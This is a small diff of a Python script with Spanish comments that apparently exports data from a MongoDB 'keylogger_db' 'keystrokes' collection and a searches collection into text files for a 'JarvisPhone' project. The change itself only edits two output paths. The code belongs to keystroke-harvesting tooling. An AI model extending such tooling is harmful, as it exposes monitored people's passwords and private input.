@@ -57,8 +57,8 @@ collection = connect_to_mongodb(uri, database_name, collection_name)
 collection2 =  connect_to_mongodb(uri, "keylogger_db", "keystrokes")
 
 # Definir la dirección donde se guardará el archivo, asegurando la sintaxis correcta de la ruta
-file_path = r"TEST\JarvisPhone\Prueba\Datos Extraidos\busquedas.txt"  # Cambia esta ruta a la dirección donde quieres guardar el archivo
-file_path2 = r"TEST\JarvisPhone\Prueba\Datos Extraidos\keys.txt"  # Cambia esta ruta a la dirección donde quieres guardar el archivo
+file_path = r"TEST\JarvisPhone\CodigoNuevoFuncional\Datos Extraidos\busquedas.txt"  # Cambia esta ruta a la dirección donde quieres guardar el archivo
+file_path2 = r"TEST\JarvisPhone\CodigoNuevoFuncional\Datos Extraidos\keys.txt"  # Cambia esta ruta a la dirección donde quieres guardar el archivo
 
 # Exportar los datos si la colección es válida
 if 1 ==1:
